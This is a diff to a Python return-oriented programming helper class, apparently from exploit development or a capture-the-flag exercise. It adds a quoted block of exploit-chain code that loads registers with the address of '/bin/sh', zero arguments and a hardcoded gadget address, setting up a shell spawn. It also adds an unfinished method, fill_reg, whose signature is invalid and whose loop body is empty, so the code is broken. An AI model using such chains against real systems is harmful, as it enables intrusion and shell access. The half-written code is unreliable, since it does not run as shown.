@@ -35,6 +35,33 @@ class our_rop:
             elif 'pop ' + reg in i:
                 return [i.split(':')[0], s.num_pops(i)]
     
+    def fill_reg(s, regs vals):
+        for i in regs:
+
+
+        
+
+
+
+'''
+
+# populate arg1 - rdi
+chain += p64((rop.find_gadget(['pop rdi', 'ret']))[0])
+chain += p64(next(elf.search(b'/bin/sh\x00')))
+
+# populate arg2 - rsi
+chain += p64((rop.find_gadget(['pop rsi', 'ret']))[0])
+chain += p64(0)
+
+# populate arg3 - rdx
+#chain += p64((rop.find_gadget(['pop rdx', 'ret']))[0])
+# 0x00000000004007c0: pop rdx; pop r11; pop r8; ret;
+
+chain += p64(0x00000000004007c0)
+chain += p64(0)*3
+
+'''
+
 
 
 
